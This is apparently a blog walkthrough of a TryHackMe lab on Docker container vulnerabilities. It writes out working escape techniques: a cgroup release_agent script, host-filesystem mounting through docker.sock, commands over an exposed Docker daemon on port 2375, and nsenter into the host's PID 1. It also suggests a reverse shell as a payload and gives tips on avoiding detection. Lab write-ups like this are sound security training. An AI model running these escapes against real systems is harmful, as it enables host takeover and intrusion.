---
title: "Container Vulnerabilities"
seoTitle: "Container Security Risks"
seoDescription: "Identify Docker vulnerabilities like misconfigurations, exposed daemons, privilege escalations, and learn risks and mitigation strategies"
datePublished: Thu Nov 07 2024 14:17:56 GMT+0000 (Coordinated Universal Time)
cuid: cm37e7bn8000009l8e3htcxhv
slug: container-vulnerabilities
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1730984913211/66211344-70ed-49b8-958e-0bbe725eeb9e.webp
tags: devops, hacking, containers, devsecops, cybersecurity-1

---

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730984017995/1f03d213-0df5-4f34-8745-918efd6d0c0b.png align="center")

We’ve provided the details for the machine. Let’s first check if we can ping the machine (i.e. we’ve successfully connected to the network.)

```bash
ping -c3 10.10.124.169
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730984132036/ff807a32-3979-454f-a3a2-b888ef3f9db3.png align="center")

Now let’s connect to the machine via `SSH`.

```bash
ssh root@10.10.124.169
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730984234462/31e2be0b-fb05-4eb0-903c-4e3ee64cd65e.png align="center")

# Container Vulnerabilities

Before we begin, it's important to recap some of the things learned in the Intro to Containerisation room. First, let's recall that containers are isolated and have minimal environments. The picture below depicts a container's environment.

![Illustrating three containers on a single computer](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/1e6a0e70d8eca4267d7af005a587c54e.png align="left")

**Some important things to note are:**

Just because you have access (i.e., a foothold) to a container does not mean you have access to the host operating system and associated files or other containers.

Due to the minimal nature of containers (i.e. they only have the tools specified by the developer), you are unlikely to find fundamental tools such as Netcat, Wget, or even Bash! This makes interacting within a container quite difficult for an attacker.

What Sort of Vulnerabilities Can We Expect To Find in Docker Containers

While Docker containers are designed to isolate applications from one another, they can still be vulnerable. For example, hard-coded passwords for an application can still be present. If an attacker can gain access through a vulnerable web application, for example, they will be able to find these credentials. You can see an example of a web application containing hard-coded credentials to a database server in the code snippet below:

```php
/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database name */
define( 'DB_NAME', 'sales' );

/** Database username */
define( 'DB_USER', 'production' );

/** Database password */
define( 'DB_PASSWORD', 'SuperstrongPassword321!' );
```

This, of course, isn't the only vulnerability that can be exploited in containers. The other potential attack vectors have been listed in the table below.

<table><tbody><tr><td colspan="1" rowspan="1"><p><strong>Vulnerability</strong></p></td><td colspan="1" rowspan="1"><p><strong>Description</strong></p></td></tr><tr><td colspan="1" rowspan="1"><p>Misconfigured Containers</p></td><td colspan="1" rowspan="1"><p>Misconfigured containers will have privi<a target="_self" rel="noopener noreferrer nofollow" href="https://tryhackme.com/room/introtocontainerisation" style="pointer-events: none">leges that are not necessary for the operation of the conta</a>ine<a target="_self" rel="noopener noreferrer nofollow" href="https://tryhackme.com/room/introtocontainerisation" style="pointer-events: none">r. For example, a contain</a>er running in "privileged" mode will have access to the host operating system - removing the layers of isolation.</p></td></tr><tr><td colspan="1" rowspan="1"><p>Vulnerable Images</p></td><td colspan="1" rowspan="1"><p>There have been numerous incidents of popular Docker images being backdoored to p<a target="_self" rel="noopener noreferrer nofollow" href="https://tryhackme.com/room/introtocontainerisation" style="pointer-events: none">erform malicious actions such as crypto mining</a>.</p></td></tr><tr><td colspan="1" rowspan="1"><p>Network Connectivity</p></td><td colspan="1" rowspan="1"><p>A container that is not correctly networked can be exposed to the internet. Fo<a target="_self" rel="noopener noreferrer nofollow" href="https://tryhackme.com/room/introtocontainerisation" style="pointer-events: none">r example, a database container for a web applica</a>tion should only be accessible to the web application container - not the internet.</p></td></tr></tbody></table>

This is just a summary of some of the types of vulnerabilities that can exist within a container. The tasks in this room will delve into these further!

# Vulnerability 1: Privileged Containers (Capabilities)

Understanding Capabilities

At its fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.

These capabilities determine what permissions a Docker container has to the operating system. Docker containers can run in two modes:

* User (Normal) mode
    
* Privileged mode
    

In the diagram below, we can see the two different modes in action and the level of access each mode has to the host:

![Illustrating the different container modes and privileges and the level of access they have to the operating system.](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/privileged-container-layers.png align="left")

Note how containers #1 and #2 are running in "user/normal" mode, whereas container #3 is running in "privileged" mode. Containers in "user" mode interact with the operating system through the Docker Engine. Privileged containers, however, do not do this. Instead, they bypass the Docker Engine and directly communicate with the operating system.

What Does This Mean for Us

Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root on the host.

We can use a utility such as `capsh` which comes with the *libcap2-bin* package to list the capabilities our container has: `capsh --print` . Capabilities are used in Linux to assign specific permissions to a process. Listing the capabilities of the container is a good way to determine the syscalls that can be made and potential mechanisms for exploitation.

Some capabilities of interest have been provided in the terminal snippet below.

Listing capabilities of a privileged Docker Container

```bash
capsh --print 
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730985302593/832b7840-86c6-4a7e-bdd0-53d77d220fc6.png align="center")

In the example exploit below, we are going to use the *mount* syscall (as allowed by the container's capabilities) to mount the host's control groups into the container.

The code snippet below is based upon (but a modified) version of the [Proof of Concept (PoC) created by Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.), which details the inner workings of this exploit well.

```bash
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

2. echo 1 > /tmp/cgrp/x/notify_on_release

3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

4. echo "$host_path/exploit" > /tmp/cgrp/release_agent

5. echo '#!/bin/sh' > /exploit

6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

7. chmod a+x /exploit

8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

-------

Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.
```

Explaining the Vulnerability

**1.** We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system. Since we can manage "cgroups" as root on the host, we'll mount this to "*/tmp/cgrp*" on the container.

**2**. For our exploit to execute, we'll need to tell the kernel to run our code. By adding "1" to "*/tmp/cgrp/x/notify\_on\_release*", we're telling the kernel to execute something once the "cgroup" finishes. [(Paul Menage., 2004)](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt).

**3\.** We find out where the container's files are stored on the host and store it as a variable.

**4.** We then echo the location of the container's files into our "*/exploit*" and then ultimately to the "release\_agent" which is what will be executed by the "cgroup" once it is released.

**5.** Let's turn our exploit into a shell on the host

**6.** Execute a command to echo the host flag into a file named "flag.txt" in the container once "*/exploit*" is executed.

**7.** Make our exploit executable!

**8.** We create a process and store that into "*/tmp/cgrp/x/cgroup.procs*". When the processs is released, the contents will be executed.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730985206597/ded22c56-6232-4510-8caf-8826c2f29597.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730985212210/8d05198e-3ec4-4010-98aa-f95a52f88a31.png align="center")

Flag: **THM{MOUNT\_MADNESS}**

# Vulnerability 2: Escaping via Exposed Docker Daemon

Unix Sockets 101 (One Size Fits All)

When mentioning "sockets", you would likely think of "sockets" in networking. Well, the concept here is almost the same. Sockets are used to move data between two places. Unix sockets use the filesystem to transfer data rather than networking interfaces. This is known as Inter-process Communication (IPC) and is essential in operating systems because being able to send data between processes is extremely important.

Unix sockets are substantially quicker at transferring data than TCP/IP sockets ([Percona., 2020](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/)). This is why database technologies such as [Redis](https://redis.io/) boast such outstanding performance. Unix sockets also use file system permissions. This is important to remember for the next heading.

How Does Docker Use Sockets

When interacting with the Docker Engine (i.e. running commands such as `docker run`), this will be done using a socket (usually, this is done using a Unix socket unless you execute the commands to a remote Docker host). Recall that Unix sockets use filesystem permissions. This is why you must be a member of the Docker group (or root!) to run Docker commands, as you will need the permissions to access the socket owned by Docker.

Verifying that our user is a part of the Docker group

```bash
cmnatic@demo-container:~$ groups
cmnatic sudo docker
```

Finding the Docker Socket in a Container﻿

Remember, containers interact with the host operating system using the Docker Engine (and, therefore, have access to the Docker socket!) This socket (named docker.sock) will be mounted in the container. The location of this varies by the operating system the container is running, so you would want to `find` it. However, in this example, the container runs Ubuntu 18.04, meaning the *docker.sock* is located in */var/run.* 

***Note:*** *This location can vary based on the operating system and can even be manually set by the developer at runtime of the container.*

Finding the docker.sock file in a container

```bash
cmnatic@demo-container:~$ ls -la /var/run | grep sock
srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock   
```

Exploiting the Docker Socket in a Container

First, let's confirm we can execute docker commands. You will either need to be root on the container or have the "docker" group permissions as a lower-privileged user. 

Let's break down the vulnerability here:

We will use Docker to create a new container and mount the host's filesystem into this new container. Then we are going to access the new container and look at the host's filesystem.

Our final command will look like this:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730987502368/94227f4a-c256-45c6-bc95-0c1d071311ad.png align="center")

which does the following:

**1.** We will need to upload a docker image. For this room, I have provided this on the VM. It is called "alpine". The "alpine" distribution is not a necessity, but it is extremely lightweight and will blend in a lot better. To avoid detection, it is best to use an image that is already present in the system, otherwise, you will have to upload this yourself.

**2**. We will use `docker run` to start the new container and mount the host's file system (/) to (/mnt) in the new container: `docker run -v /:/mnt` 

**3\.** We will tell the container to run interactively (so that we can execute commands in the new container): `-it`

**4.** Now, we will use the already provided alpine image: `alpine`

**5.** We will use `chroot` to change the root directory of the container to be */mnt* (where we are mounting the files from the host operating system): `chroot /mnt`

**6.** Now, we will tell the container to run `sh` to gain a shell and execute commands in the container: `sh`

\-------

You may need to "**Ctrl + C**" to cancel the exploit once or twice for this vulnerability to work, but, as you can see below, we have successfully mounted the host operating system's filesystem into the new alpine container.

Verify Success

After executing the command, we should see that we have been placed into a new container. Remember, we mounted the host's filesystem to /mnt (and then used `chroot` to make the container's */mnt* become /)

So, let's see the contents of */*  by doing `ls /`

Listing the contents of / on the new container (which will have the host operating system's files.

```bash
ls /
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730987611516/c160013a-273c-44af-aedb-91773d7c26ad.png align="center")

Now let’s grab our flag.

```bash
cat flag.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730987825221/8577afad-affd-4477-ae87-1ae9f3677cf3.png align="center")

Flag: **THM{NEVER-ENOUGH-SOCKS}**

# Vulnerability 3: Remote Code Execution via Exposed Docker Daemon

The Docker Engine - TCP Sockets Edition

Recall how Docker uses sockets to communicate between the host operating system and containers in the previous task. Docker can also use TCP sockets to achieve this. 

Docker can be remotely administrated. For example, using management tools such as [Portainer](https://www.portainer.io/) or [Jenkins](https://www.jenkins.io/) to deploy containers to test their code (yay, automation!).

The Vulnerability

The Docker Engine will listen on a port when configured to be run remotely. The Docker Engine is easy to make remotely accessible but difficult to do securely. The vulnerability here is Docker is remotely accessible and allows anyone to execute commands. First, we will need to enumerate.

Enumerating: Finding Out if a Device Has Docker Remotely Accessible

By default, the engine will run on **port 2375.** We can confirm this by performing an Nmap scan against your target (10.10.124.169) from your AttackBox.

Verifying if our target has Docker remotely accessible

```bash
nmap -sV -p 2375 10.10.124.169
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988137394/f79a34fe-727a-4c34-8b0e-58ab5e6bf83a.png align="center")

Looks like it's open; we're going to use the `curl` command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker daemon: `curl http://10.10.124.169:2375/version`

CURLing the Docker Socket

```bash
curl http://10.10.124.169:2375/version
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988169623/71a51274-178e-436b-a4a8-79ac3f9cf8c4.png align="center")

Executing Docker Commands on Our Target

For this, we'll need to tell our version of Docker to send the command to our target (not our machine). We can add the "-H" switch to our target. To test if we can run commands, we'll list the containers on the target: `docker -H tcp://10.10.124.169:2375 ps`

Listing the containers on our target

```bash
docker -H tcp://10.10.124.169:2375 ps
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988209983/d888b07c-42ad-4f75-9744-361bb6e41360.png align="center")

What Now

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyze further. However, I've included some commands that you may wish to explore:

<table><tbody><tr><td colspan="1" rowspan="1"><p><strong>Command<br></strong></p></td><td colspan="1" rowspan="1"><p><strong>Description<br></strong></p></td></tr><tr><td colspan="1" rowspan="1"><p>network ls</p></td><td colspan="1" rowspan="1"><p>Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!</p></td></tr><tr><td colspan="1" rowspan="1"><p>images</p></td><td colspan="1" rowspan="1"><p>List images used by containers; data can also be exfiltrated by reverse-engineering the image.</p></td></tr><tr><td colspan="1" rowspan="1"><p>exec</p></td><td colspan="1" rowspan="1"><p>Execute a command on a container.</p></td></tr><tr><td colspan="1" rowspan="1"><p>run</p></td><td colspan="1" rowspan="1"><p>Run a container.</p></td></tr></tbody></table>

# Vulnerability 4: Abusing Namespaces

What Are Namespaces

Namespaces segregate system resources such as processes, files, and memory away from other namespaces. Every process running on Linux will be assigned two things:

* A namespace
    
* A Process Identifier (PID)
    

Namespaces are how containerisation is achieved! Processes can only "see" the process in the same namespace. Take Docker, for example, every new container will run as a new namespace, although the container may run multiple applications (processes).

Let's prove the concept of containerisation by comparing the number of processes on the host operating system, in comparison to the Docker container that the host is running (an apache2 web server):

Listing running processes on a "normal" Ubuntu system

```bash
ps aux
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988544956/8c707e9f-737c-4d3f-b314-3aea7e0c5a6a.png align="center")

In the first column on the very left, we can see the user the process is running as including the process number (PID). Additionally, notice that the column on the very right has the command or application that started the process (such as Firefox and Gnome terminal). It's important to note here that multiple applications and processes are running (specifically 320!). 

Generally speaking, a Docker container will have very few processes running. This is because a container is designed to do one task. I.e., just run a web server or a database.

Determining if We're in a Container (Processes)

Let's list the processes running in our Docker container using `ps aux`. It's important to note that we only have six processes running in this example. The difference in the number of processes is usually a great indicator that we're in a container.

Additionally, the first process in the snippet below has a PID of 1. This is the first process that is running. PID 1 (usually init) is the ancestor (parent) for all future processes that are started. If, for whatever reason, this process is stopped, then all other processes are stopped too. 

Listing running processes on a container

```bash
root@demo-container:~# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.2 166612 11356 ?        Ss   00:47   0:00 /sbin/init 
root          14  0.1 0.1 6520 5212 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND 
www-data      15  0.1 0.1 1211168 4112 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND 
www-data      16  0.1 0.1 1211168 4116 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND
root          81  0.0 0.0 5888 2972 pts/0  R+ 00:52 ps aux 
```

Comparatively, we can see that only 5 processes are running. A good indicator that we're in a container! However, as we come to discover shortly, this is not 100% indicative. There are cases where, ironically, you want the container to be able to interact directly with the host.

How Can We Abuse Namespaces

Recall cgroups (control groups) in a previous vulnerability. We are going to be using these in another method of exploitation. This attack abuses conditions where the container will share the same namespace as the host operating system (and therefore, the container can communicate with the processes on the host).

You might see this in cases where the container relies on a process running or needs to "plug in" to the host such as the use of debugging tools. In these situations, you can expect to see the host's processes in the container when listing them via `ps aux`.

Edge case: Determining if a container can interact with the host's processes

```bash
ps aux
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988703734/e0d53f8d-cc24-4675-9a8a-83868c85a971.png align="center")

The Exploit

For this vulnerability, we will be using `nsenter` (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "**/sbin/init**" process on the host, meaning that we can launch new commands such as a bash shell on the host. 

Use the following exploit:

```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988866828/262e83a1-11a9-492c-8a6a-591c1ca30c41.png align="center")

which does the following:

**1.** We use the `--target` switch with the value of "**1**" to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!

**2**. Specifying `--mount` this is where we provide the mount namespace of the process that we are targeting. *"If no file is specified, enter the mount namespace of the target process."* [(Man.org., 2013)](https://man7.org/linux/man-pages/man1/nsenter.1.html).

**3.** The `--uts` switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services).

**4.** The `--ipc` switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared.

**5.** The `--net` switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host).

**6.** As we are targeting the **"/sbin/init"** process #1 (although it's a symbolic link to "**lib/systemd/systemd**" for backwards compatibility), we are using the namespace and permissions of the [systemd](https://www.freedesktop.org/wiki/Software/systemd/) daemon for our new process (the shell)

**7.** Here's where our process will be executed into this privileged namespace: `sh` or a shell. This will execute in the same namespace (and therefore privileges) of the kernel.

\--------

You may need to "**Ctrl + C**" to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container and can look around the host OS (showing the change in hostname)

Using the command line of the container to run commands on the host.

```bash
hostname         
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988911184/944b6503-3fa2-47ad-98fe-c7fb17a44f21.png align="center")

Success! We will now be able to look around the host operating system in the namespace as root, meaning we have full access to anything on the host!

Now let’s get our flag from `/home/tryhackme`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730988941872/c807266c-77f7-49d1-9c92-08e5b15f0764.png align="center")

Flag: **THM{YOUR-SPACE-MY-SPACE}**